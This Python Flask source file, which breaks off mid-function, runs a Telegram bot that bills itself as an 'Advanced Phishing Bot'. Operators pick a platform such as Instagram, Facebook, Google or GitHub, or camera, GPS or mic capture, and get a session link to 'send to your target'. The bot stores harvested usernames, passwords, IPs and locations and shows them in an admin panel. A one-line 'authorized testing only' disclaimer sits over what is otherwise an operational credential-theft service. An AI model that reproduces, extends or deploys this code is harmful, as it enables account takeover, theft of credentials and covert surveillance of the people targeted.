import os
import sys
import json
import sqlite3
import string
import random
import logging
import base64
import html
from datetime import datetime
from io import BytesIO
from urllib.parse import urlparse

import requests
from flask import Flask, request, jsonify, send_file, redirect, render_template_string

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID", "")
ADMIN_IDS_STR = os.environ.get("ADMIN_IDS", "")
FLASK_SECRET = os.environ.get("FLASK_SECRET", os.urandom(24).hex())

RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
RAILWAY_URL = os.environ.get("RAILWAY_URL", "")
PUBLIC_URL = RENDER_URL or RAILWAY_URL or os.environ.get("PUBLIC_URL", "http://localhost:5000")

ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip().isdigit()]

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = FLASK_SECRET

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
DB_PATH = "s3ju.db"

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT DEFAULT '',
            first_seen TEXT DEFAULT '',
            total_captures INTEGER DEFAULT 0,
            agreed_terms INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            platform TEXT,
            created TEXT,
            status TEXT DEFAULT 'active',
            ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            city TEXT DEFAULT '',
            total_views INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            chat_id INTEGER,
            platform TEXT,
            username TEXT DEFAULT '',
            password TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            country TEXT DEFAULT '',
            city TEXT DEFAULT '',
            latitude TEXT DEFAULT '',
            longitude TEXT DEFAULT '',
            has_photo INTEGER DEFAULT 0,
            has_mic INTEGER DEFAULT 0,
            captured_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS webhook_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            update_id INTEGER,
            message TEXT,
            received_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_chat_id INTEGER,
            action TEXT,
            target_chat_id INTEGER DEFAULT 0,
            details TEXT DEFAULT '',
            created_at TEXT DEFAULT ''
        );
    """)
    conn.commit()
    conn.close()

def generate_session_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def is_admin(chat_id):
    if chat_id in ADMIN_IDS:
        return True
    conn = get_db()
    user = conn.execute("SELECT is_admin FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    conn.close()
    return user and user["is_admin"] == 1

def send_telegram(chat_id, text, parse_mode="HTML", reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram send error: {e}")
        return None

def send_photo_telegram(chat_id, photo_bytes, caption="", reply_markup=None):
    url = f"{TELEGRAM_API}/sendPhoto"
    try:
        files = {"photo": ("image.jpg", photo_bytes, "image/jpeg")}
        data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        r = requests.post(url, data=data, files=files, timeout=15)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram photo error: {e}")
        return None

def send_document_telegram(chat_id, file_bytes, filename, caption=""):
    url = f"{TELEGRAM_API}/sendDocument"
    try:
        files = {"document": (filename, file_bytes, "application/octet-stream")}
        data = {"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}
        r = requests.post(url, data=data, files=files, timeout=30)
        return r.json()
    except Exception as e:
        logger.error(f"Telegram document error: {e}")
        return None

def answer_callback(callback_id, text, show_alert=False):
    url = f"{TELEGRAM_API}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except:
        return None

def delete_message(chat_id, message_id):
    url = f"{TELEGRAM_API}/deleteMessage"
    payload = {"chat_id": chat_id, "message_id": message_id}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def set_webhook(url):
    wh_url = f"{TELEGRAM_API}/setWebhook"
    payload = {"url": url, "allowed_updates": ["message", "callback_query"]}
    try:
        r = requests.post(wh_url, json=payload, timeout=10)
        logger.info(f"Webhook set to {url}: {r.json()}")
        return r.json()
    except Exception as e:
        logger.error(f"Webhook set error: {e}")
        return None

def notify_admins(action, target_id, admin_id, target_username="", admin_username=""):
    target_mention = f"<code>{target_id}</code>"
    admin_mention = f"<code>{admin_id}</code>"
    if target_username:
        target_mention = f"@{target_username} (<code>{target_id}</code>)"
    if admin_username:
        admin_mention = f"@{admin_username} (<code>{admin_id}</code>)"

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if action == "promoted":
        msg = (
            f"👑 <b>ADMIN PROMOTED</b> 👑\n\n"
            f"👤 <b>New Admin:</b> {target_mention}\n"
            f"🆙 <b>Promoted by:</b> {admin_mention}\n"
            f"⏰ <b>Time:</b> {timestamp}"
        )
    elif action == "demoted":
        msg = (
            f"⬇️ <b>ADMIN DEMOTED</b> ⬇️\n\n"
            f"👤 <b>Demoted User:</b> {target_mention}\n"
            f"⬇️ <b>Demoted by:</b> {admin_mention}\n"
            f"⏰ <b>Time:</b> {timestamp}"
        )
    else:
        return

    notified = []

    if OWNER_CHAT_ID:
        try:
            owner_id = int(OWNER_CHAT_ID)
            if owner_id != admin_id:
                send_telegram(owner_id, msg)
                notified.append(owner_id)
        except:
            pass

    conn = get_db()
    admins = conn.execute("SELECT chat_id FROM users WHERE is_admin = 1").fetchall()
    conn.close()

    for a in admins:
        aid = a["chat_id"]
        if aid != admin_id and aid not in notified:
            try:
                if OWNER_CHAT_ID:
                    if aid != int(OWNER_CHAT_ID):
                        send_telegram(aid, msg)
                        notified.append(aid)
            except:
                pass

    logger.info(f"Notified {len(notified)} admins about {action}: {target_id}")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BANNER_DIR = os.path.join(BASE_DIR, "banner")
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")

def load_banner(filename):
    path = os.path.join(BANNER_DIR, filename)
    try:
        with open(path, "rb") as f:
            return f.read()
    except:
        return None

def load_template(filename):
    path = os.path.join(TEMPLATES_DIR, filename)
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except:
        return None

PLATFORM_TEMPLATES = {
    "instagram": "instagram.html",
    "facebook": "facebook.html",
    "twitter": "twitter.html",
    "linkedin": "linkedin.html",
    "github": "github.html",
    "google": "google.html",
    "snapchat": "snapchat.html",
}

PLATFORM_REDIRECTS = {
    "instagram": "https://www.instagram.com",
    "facebook": "https://www.facebook.com",
    "twitter": "https://x.com",
    "linkedin": "https://www.linkedin.com",
    "github": "https://github.com/login",
    "google": "https://accounts.google.com",
    "snapchat": "https://www.snapchat.com",
    "camera": "https://www.instagram.com",
    "gps": "https://maps.google.com",
    "mic": "https://www.instagram.com",
}

def get_redirect_url(platform):
    return PLATFORM_REDIRECTS.get(platform.lower(), "https://www.google.com")

def get_visitor_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    if request.headers.get("X-Real-IP"):
        return request.headers["X-Real-IP"]
    return request.remote_addr or "0.0.0.0"

PLATFORM_BUTTONS = [
    [{"text": "📸 Instagram", "callback_data": "platform_instagram"},
     {"text": "📘 Facebook", "callback_data": "platform_facebook"},
     {"text": "🐦 Twitter/X", "callback_data": "platform_twitter"}],
    [{"text": "💼 LinkedIn", "callback_data": "platform_linkedin"},
     {"text": "🐙 GitHub", "callback_data": "platform_github"},
     {"text": "🔴 Google", "callback_data": "platform_google"}],
    [{"text": "👻 Snapchat", "callback_data": "platform_snapchat"},
     {"text": "📷 Camera", "callback_data": "platform_camera"},
     {"text": "📍 GPS", "callback_data": "platform_gps"}],
    [{"text": "🎤 Mic", "callback_data": "platform_mic"}],
]

ADMIN_MENU = [
    [{"text": "📊 Dashboard", "callback_data": "admin_dashboard"},
     {"text": "👥 Users", "callback_data": "admin_users"}],
    [{"text": "🔓 Captures", "callback_data": "admin_captures"},
     {"text": "📋 Sessions", "callback_data": "admin_sessions"}],
    [{"text": "👑 Add Admin", "callback_data": "admin_add_admin"},
     {"text": "⬇️ Remove Admin", "callback_data": "admin_remove_admin"}],
    [{"text": "🔨 Ban User", "callback_data": "admin_ban_user"},
     {"text": "✅ Unban User", "callback_data": "admin_unban_user"}],
    [{"text": "📢 Broadcast", "callback_data": "admin_broadcast"},
     {"text": "⚠️ Warn User", "callback_data": "admin_warn"}],
    [{"text": "🗑️ Clear All Data", "callback_data": "admin_clear_all"}],
]

@app.route("/", methods=["GET"])
def index():
    return "<h1>🚀 S3JU v1.0</h1><p>Developed by D4RK-K1NG</p>"

@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "ok", 200

        conn = get_db()
        update_id = data.get("update_id", 0)
        conn.execute("INSERT INTO webhook_logs (update_id, message, received_at) VALUES (?, ?, ?)",
                     (update_id, json.dumps(data), datetime.now().isoformat()))
        conn.commit()
        conn.close()

        if "callback_query" in data:
            handle_callback(data["callback_query"])
            return "ok", 200

        if "message" in data:
            handle_message(data["message"])
            return "ok", 200

    except Exception as e:
        logger.error(f"Webhook error: {e}")

    return "ok", 200

def get_or_create_user(chat_id, username=""):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    if not user:
        conn.execute("INSERT INTO users (chat_id, username, first_seen, agreed_terms) VALUES (?, ?, ?, 0)",
                     (chat_id, username, datetime.now().isoformat()))
        conn.commit()
        user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    conn.close()
    return user

def handle_message(message):
    chat_id = message.get("chat", {}).get("id")
    text = message.get("text", "").strip()
    username = message.get("from", {}).get("username", str(chat_id))

    if not chat_id:
        return

    user = get_or_create_user(chat_id, username)

    if user["is_banned"]:
        send_telegram(chat_id, "⛔ You are banned from using this bot.")
        return

    if user["agreed_terms"] == 2 and is_admin(chat_id):
        conn = get_db()
        users = conn.execute("SELECT chat_id FROM users WHERE is_banned = 0").fetchall()
        sent = 0
        for u in users:
            try:
                send_telegram(u["chat_id"], f"📢 <b>Broadcast from Admin</b>\n\n{text}")
                sent += 1
            except:
                pass
        conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        send_telegram(chat_id, f"✅ Broadcast sent to {sent} users.")
        return

    if user["agreed_terms"] == 3 and is_admin(chat_id):
        try:
            target_id = int(text.strip())
            conn = get_db()
            target_user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (target_id,)).fetchone()
            target_username = ""
            if not target_user:
                conn.execute("INSERT INTO users (chat_id, username, first_seen, is_admin) VALUES (?, '', ?, 1)",
                             (target_id, datetime.now().isoformat()))
            else:
                if target_user["is_admin"] == 1:
                    send_telegram(chat_id, f"⚠️ User {target_id} is already an admin.")
                    conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
                    conn.commit()
                    conn.close()
                    return
                target_username = target_user["username"]
                conn.execute("UPDATE users SET is_admin = 1 WHERE chat_id = ?", (target_id,))

            conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'add_admin', ?, 'Added as admin', ?)",
                         (chat_id, target_id, datetime.now().isoformat()))
            conn.commit()
            conn.close()

            send_telegram(chat_id, f"👑 User {target_id} is now an admin!")
            send_telegram(target_id, "👑 <b>You have been promoted to admin!</b>\n\nUse /admin to access the admin panel.")

            admin_user = user["username"] or str(chat_id)
            notify_admins("promoted", target_id, chat_id, target_username, admin_user)

        except:
            send_telegram(chat_id, "❌ Invalid ID. Send a numeric chat ID.")
            conn = get_db()
            conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
            conn.commit()
            conn.close()
        return

    if user["agreed_terms"] == 4 and is_admin(chat_id):
        try:
            target_id = int(text.strip())
            if target_id in ADMIN_IDS:
                send_telegram(chat_id, "❌ Cannot remove this admin. They are defined in environment variables.")
                conn = get_db()
                conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
                conn.commit()
                conn.close()
                return

            conn = get_db()
            target_user = conn.execute("SELECT username FROM users WHERE chat_id = ?", (target_id,)).fetchone()
            target_username = target_user["username"] if target_user else ""

            conn.execute("UPDATE users SET is_admin = 0 WHERE chat_id = ?", (target_id,))
            conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'remove_admin', ?, 'Removed admin privileges', ?)",
                         (chat_id, target_id, datetime.now().isoformat()))
            conn.commit()
            conn.close()

            send_telegram(chat_id, f"⬇️ Admin privileges removed from {target_id}.")
            send_telegram(target_id, "⬇️ <b>Your admin privileges have been removed.</b>")

            admin_user = user["username"] or str(chat_id)
            notify_admins("demoted", target_id, chat_id, target_username, admin_user)

        except:
            send_telegram(chat_id, "❌ Invalid ID.")
            conn = get_db()
            conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
            conn.commit()
            conn.close()
        return

    if user["agreed_terms"] == 5 and is_admin(chat_id):
        try:
            target_id = int(text.strip())
            conn = get_db()
            existing = conn.execute("SELECT * FROM users WHERE chat_id = ?", (target_id,)).fetchone()
            if existing:
                conn.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (target_id,))
                conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'ban_user', ?, 'User banned', ?)",
                             (chat_id, target_id, datetime.now().isoformat()))
                send_telegram(chat_id, f"🔨 User {target_id} has been banned.")
                try:
                    send_telegram(target_id, "⛔ <b>You have been banned from using this bot.</b>")
                except:
                    pass
            else:
                send_telegram(chat_id, "❌ User not found.")
            conn.commit()
            conn.close()
        except:
            send_telegram(chat_id, "❌ Invalid ID.")
        conn = get_db()
        conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        return

    if user["agreed_terms"] == 6 and is_admin(chat_id):
        try:
            target_id = int(text.strip())
            conn = get_db()
            conn.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (target_id,))
            conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'unban_user', ?, 'User unbanned', ?)",
                         (chat_id, target_id, datetime.now().isoformat()))
            conn.commit()
            conn.close()
            send_telegram(chat_id, f"✅ User {target_id} has been unbanned.")
            try:
                send_telegram(target_id, "✅ <b>You have been unbanned.</b>")
            except:
                pass
        except:
            send_telegram(chat_id, "❌ Invalid ID.")
        conn = get_db()
        conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        return

    if user["agreed_terms"] == 7 and is_admin(chat_id):
        parts = text.split(" ", 1)
        if len(parts) == 2:
            try:
                target_id = int(parts[0])
                reason = parts[1]
                send_telegram(target_id, f"⚠️ <b>Warning from Admin</b>\n\n{reason}")
                conn = get_db()
                conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'warn_user', ?, ?, ?)",
                             (chat_id, target_id, reason, datetime.now().isoformat()))
                conn.commit()
                conn.close()
                send_telegram(chat_id, f"✅ Warning sent to {target_id}.")
            except:
                send_telegram(chat_id, "❌ Invalid format. Use: chat_id reason")
        else:
            send_telegram(chat_id, "❌ Use format: <code>chat_id reason for warning</code>")
        conn = get_db()
        conn.execute("UPDATE users SET agreed_terms = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        return

    if text == "/start":
        img = load_banner("image1.jpg")
        caption = "━━━━━━━━━━━━━━━━━━━━━━━\n\n 🚀 <b>S3JU v1.0</b>\n👤 Developed by <b>D4RK-K1NG</b>\n\n🔧 Advanced Phishing Bot\n\n📌 Use /attack to begin\n📌 Use /help for commands\n\n━━━━━━━━━━━━━━━━━━━━━━━"
        if img:
            send_photo_telegram(chat_id, img, caption)
        else:
            send_telegram(chat_id, caption)
        return

    if text == "/attack":
        keyboard = {
            "inline_keyboard": [
                [{"text": "✅ I AGREE", "callback_data": "agree_terms"},
                 {"text": "❌ DECLINE", "callback_data": "decline_terms"}]
            ]
        }
        img = load_banner("image2.jpg")
        caption = "━━━━━━━━━━━━━━━━━━━━━━━\n\n⚠️ <b>USE AT YOUR OWN RISK</b>\n\n🔐 This tool is for authorized security testing only.\n📋 By agreeing, you confirm you have explicit permission to test the target systems.\n\nDo you accept these terms?\n\n━━━━━━━━━━━━━━━━━━━━━━━"
        if img:
            send_photo_telegram(chat_id, img, caption, reply_markup=keyboard)
        else:
            send_telegram(chat_id, caption, reply_markup=keyboard)
        return

    if text == "/stats":
        conn = get_db()
        sessions = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE chat_id = ?", (chat_id,)).fetchone()
        captures = conn.execute("SELECT COUNT(*) as cnt FROM captures WHERE chat_id = ?", (chat_id,)).fetchone()
        active = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE chat_id = ? AND status = 'active'", (chat_id,)).fetchone()
        views = conn.execute("SELECT COALESCE(SUM(total_views), 0) as cnt FROM sessions WHERE chat_id = ?", (chat_id,)).fetchone()
        conn.close()
        send_telegram(chat_id,
            f"📊 <b>Your Stats</b>\n\n"
            f"📋 Total Sessions: <code>{sessions['cnt']}</code>\n"
            f"🟢 Active Sessions: <code>{active['cnt']}</code>\n"
            f"🔓 Total Captures: <code>{captures['cnt']}</code>\n"
            f"👁️ Total Views: <code>{views['cnt']}</code>")
        return

    if text == "/cancel":
        conn = get_db()
        active_sessions = conn.execute(
            "SELECT session_id, platform, created FROM sessions WHERE chat_id = ? AND status = 'active' ORDER BY created DESC",
            (chat_id,)).fetchall()
        if not active_sessions:
            send_telegram(chat_id, "✅ You have no active sessions.")
            conn.close()
            return
        keyboard = {"inline_keyboard": []}
        for s in active_sessions[:10]:
            keyboard["inline_keyboard"].append([
                {"text": f"❌ {s['platform']} - {s['session_id'][:8]}", "callback_data": f"cancel_{s['session_id']}"}
            ])
        conn.close()
        send_telegram(chat_id, "🗑️ Select sessions to cancel:", reply_markup=keyboard)
        return

    if text == "/help":
        admin_section = ""
        if is_admin(chat_id):
            admin_section = "\n👑 <b>Admin commands:</b>\n/admin - Open admin panel\n/broadcast - Broadcast to all users"
        send_telegram(chat_id,
            "📚 <b>S3JU Commands</b>\n\n"
            "🚀 /start - Welcome and banner\n"
            "⚔️ /attack - Start a new attack\n"
            "📊 /stats - Your statistics\n"
            "🗑️ /cancel - Cancel active sessions\n"
            "❓ /help - This message" + admin_section)
        return

    if text == "/admin":
        if is_admin(chat_id):
            send_telegram(chat_id,
                "🔐 <b>Admin Panel</b>\n\nSelect an option below:",
                reply_markup={"inline_keyboard": ADMIN_MENU})
        else:
            send_telegram(chat_id, "⛔ You are not authorized to use this command.")
        return

    if text == "/broadcast":
        if is_admin(chat_id):
            send_telegram(chat_id, "📢 Send the message you want to broadcast to all users:")
            conn = get_db()
            conn.execute("UPDATE users SET agreed_terms = 2 WHERE chat_id = ?", (chat_id,))
            conn.commit()
            conn.close()
        else:
            send_telegram(chat_id, "⛔ You are not authorized to use this command.")
        return

    send_telegram(chat_id, "❌ Unknown command. Use /help to see available commands.")

def handle_callback(callback):
    cb_id = callback.get("id")
    chat_id = callback.get("from", {}).get("id")
    message_id = callback.get("message", {}).get("message_id")
    data = callback.get("data", "")

    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,)).fetchone()
    if not user:
        conn.close()
        answer_callback(cb_id, "Please start the bot first with /start", True)
        return

    if user["is_banned"]:
        conn.close()
        answer_callback(cb_id, "You are banned.", True)
        return

    if data == "agree_terms":
        conn.execute("UPDATE users SET agreed_terms = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        send_telegram(chat_id, "✅ Terms accepted! Select a platform:", reply_markup={"inline_keyboard": PLATFORM_BUTTONS})
        try:
            delete_message(chat_id, message_id)
        except:
            pass
        answer_callback(cb_id, "Terms accepted! Choose a platform.")
        return

    if data == "decline_terms":
        conn.close()
        edit_message(chat_id, message_id, "❌ Terms declined. Use /attack to try again.")
        answer_callback(cb_id, "Terms declined.")
        return

    if data.startswith("cancel_"):
        session_id = data.replace("cancel_", "")
        conn.execute("UPDATE sessions SET status = 'cancelled' WHERE session_id = ? AND chat_id = ?", (session_id, chat_id))
        conn.commit()
        conn.close()
        answer_callback(cb_id, "Session cancelled.")
        edit_message(chat_id, message_id, f"✅ Session {session_id[:8]} has been cancelled.")
        return

    if data.startswith("platform_"):
        platform = data.replace("platform_", "")
        session_id = generate_session_id()
        session_url = f"{PUBLIC_URL}/p/{session_id}"

        conn.execute("INSERT INTO sessions (session_id, chat_id, platform, created, status) VALUES (?, ?, ?, ?, 'active')",
                     (session_id, chat_id, platform, datetime.now().isoformat()))
        conn.commit()
        conn.close()

        platform_emojis = {
            "instagram": "📸", "facebook": "📘", "twitter": "🐦", "linkedin": "💼",
            "github": "🐙", "google": "🔴", "snapchat": "👻", "camera": "📷",
            "gps": "📍", "mic": "🎤"
        }
        emoji = platform_emojis.get(platform, "🔗")
        platform_display = platform.capitalize()

        edit_message(chat_id, message_id,
            f"✅ <b>Session Created!</b>\n\n"
            f"{emoji} <b>Platform:</b> {platform_display}\n"
            f"🔗 <b>URL:</b> <code>{session_url}</code>\n\n"
            f"📤 Send this link to your target\n"
            f"⏳ Waiting for target to visit...",
            {"inline_keyboard": [[{"text": "🗑️ Cancel Session", "callback_data": f"cancel_{session_id}"}]]})

        answer_callback(cb_id, f"Session created!")
        return

    if not is_admin(chat_id):
        conn.close()
        answer_callback(cb_id, "Unauthorized.", True)
        return

    if data == "admin_dashboard":
        total_users = conn.execute("SELECT COUNT(*) as cnt FROM users").fetchone()
        total_captures = conn.execute("SELECT COUNT(*) as cnt FROM captures").fetchone()
        active_sessions = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE status = 'active'").fetchone()
        total_banned = conn.execute("SELECT COUNT(*) as cnt FROM users WHERE is_banned = 1").fetchone()
        total_admins = conn.execute("SELECT COUNT(*) as cnt FROM users WHERE is_admin = 1").fetchone()
        total_views = conn.execute("SELECT COALESCE(SUM(total_views), 0) as cnt FROM sessions").fetchone()
        conn.close()
        edit_message(chat_id, message_id,
            f"📊 <b>Admin Dashboard</b>\n\n"
            f"👥 Total Users: <code>{total_users['cnt']}</code>\n"
            f"👑 Admins: <code>{total_admins['cnt']}</code>\n"
            f"⛔ Banned: <code>{total_banned['cnt']}</code>\n"
            f"📋 Active Sessions: <code>{active_sessions['cnt']}</code>\n"
            f"🔓 Total Captures: <code>{total_captures['cnt']}</code>\n"
            f"👁️ Total Views: <code>{total_views['cnt']}</code>\n\n"
            f"🔄 Use /admin to refresh",
            {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Dashboard loaded.")
        return

    if data == "admin_users":
        users = conn.execute("SELECT chat_id, username, total_captures, is_banned, is_admin FROM users ORDER BY total_captures DESC LIMIT 20").fetchall()
        conn.close()
        msg = "👥 <b>Users List</b> (top 20)\n\n"
        for u in users:
            badge = "👑 " if u["is_admin"] else ""
            ban = "⛔ " if u["is_banned"] else ""
            msg += f"{badge}{ban}<code>{u['chat_id']}</code> - @{u['username'] or 'N/A'} - {u['total_captures']} captures\n"
        edit_message(chat_id, message_id, msg, {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Users loaded.")
        return

    if data == "admin_captures":
        captures = conn.execute(
            "SELECT c.id, c.chat_id, c.platform, c.username, c.password, c.ip, c.captured_at FROM captures c ORDER BY c.id DESC LIMIT 15"
        ).fetchall()
        conn.close()
        if not captures:
            edit_message(chat_id, message_id, "📭 No captures yet.", {"inline_keyboard": ADMIN_MENU})
        else:
            msg = "🔓 <b>Latest Captures</b>\n\n"
            for c in captures:
                msg += f"🆔 #{c['id']} | <b>{c['platform']}</b>\n👤 User: <code>{c['chat_id']}</code>\n📧 Login: <code>{html.escape(c['username'][:20])}</code>\n🔑 Pass: <code>{html.escape(c['password'][:20])}</code>\n🌐 IP: <code>{c['ip']}</code>\n⏰ {c['captured_at'][:19]}\n\n"
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            edit_message(chat_id, message_id, msg, {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Captures loaded.")
        return

    if data == "admin_sessions":
        sessions = conn.execute(
            "SELECT session_id, chat_id, platform, status, total_views, created FROM sessions ORDER BY created DESC LIMIT 15"
        ).fetchall()
        conn.close()
        if not sessions:
            edit_message(chat_id, message_id, "📭 No sessions yet.", {"inline_keyboard": ADMIN_MENU})
        else:
            msg = "📋 <b>Recent Sessions</b>\n\n"
            for s in sessions:
                status_emoji = "🟢" if s["status"] == "active" else "🔴" if s["status"] == "captured" else "⚫"
                msg += f"{status_emoji} <b>{s['platform']}</b>\n👤 User: <code>{s['chat_id']}</code>\n🆔 ID: <code>{s['session_id'][:8]}</code>\n👁️ Views: {s['total_views']}\n⏰ {s['created'][:19]}\n\n"
            if len(msg) > 4000:
                msg = msg[:4000] + "..."
            edit_message(chat_id, message_id, msg, {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Sessions loaded.")
        return

    if data == "admin_add_admin":
        conn.execute("UPDATE users SET agreed_terms = 3 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        edit_message(chat_id, message_id,
            "👑 <b>Add Admin</b>\n\nSend me the chat ID of the user you want to promote to admin.\n\nExample: <code>123456789</code>")
        answer_callback(cb_id, "Send chat ID.")
        return

    if data == "admin_remove_admin":
        admins = conn.execute("SELECT chat_id, username FROM users WHERE is_admin = 1").fetchall()
        conn.close()
        keyboard = {"inline_keyboard": []}
        for a in admins:
            if a["chat_id"] not in ADMIN_IDS:
                keyboard["inline_keyboard"].append([
                    {"text": f"⬇️ Remove {a['chat_id']} (@{a['username'] or 'N/A'})", "callback_data": f"removeadmin_{a['chat_id']}"}
                ])
        if not keyboard["inline_keyboard"]:
            edit_message(chat_id, message_id, "❌ No removable admins found (env admins can't be removed here).", {"inline_keyboard": ADMIN_MENU})
        else:
            edit_message(chat_id, message_id, "⬇️ Select admin to remove:", reply_markup=keyboard)
        answer_callback(cb_id, "Select admin.")
        return

    if data.startswith("removeadmin_"):
        target_id = int(data.replace("removeadmin_", ""))
        if target_id in ADMIN_IDS:
            edit_message(chat_id, message_id, "❌ Cannot remove this admin. They are protected.", {"inline_keyboard": ADMIN_MENU})
            answer_callback(cb_id, "Protected admin.")
            conn.close()
            return

        target_user = conn.execute("SELECT username FROM users WHERE chat_id = ?", (target_id,)).fetchone()
        target_username = target_user["username"] if target_user else ""

        conn.execute("UPDATE users SET is_admin = 0 WHERE chat_id = ?", (target_id,))
        conn.execute("INSERT INTO admin_logs (admin_chat_id, action, target_chat_id, details, created_at) VALUES (?, 'remove_admin', ?, 'Removed via admin panel', ?)",
                     (chat_id, target_id, datetime.now().isoformat()))
        conn.commit()
        conn.close()

        admin_user = user["username"] or str(chat_id)
        notify_admins("demoted", target_id, chat_id, target_username, admin_user)

        try:
            send_telegram(target_id, "⬇️ <b>Your admin privileges have been removed.</b>")
        except:
            pass
        edit_message(chat_id, message_id, f"✅ Admin removed from {target_id}.", {"inline_keyboard": ADMIN_MENU})
        answer_callback(cb_id, "Admin removed.")
        return

    if data == "admin_ban_user":
        conn.execute("UPDATE users SET agreed_terms = 5 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        edit_message(chat_id, message_id,
            "🔨 <b>Ban User</b>\n\nSend me the chat ID of the user to ban.\n\nExample: <code>123456789</code>")
        answer_callback(cb_id, "Send chat ID.")
        return

    if data == "admin_unban_user":
        conn.execute("UPDATE users SET agreed_terms = 6 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        edit_message(chat_id, message_id,
            "✅ <b>Unban User</b>\n\nSend me the chat ID of the user to unban.\n\nExample: <code>123456789</code>")
        answer_callback(cb_id, "Send chat ID.")
        return

    if data == "admin_broadcast":
        conn.execute("UPDATE users SET agreed_terms = 2 WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
        edit_message(chat_id, message_id, "📢 Send the message you want to broadcast to all users:")
        answer_callback(cb_id, "Send broadcast message.")
        return

    if data == "admin_warn":
        conn.execute("UPDATE users SET agreed_terms = 7 WHERE chat_id = ?", (chat_id,))
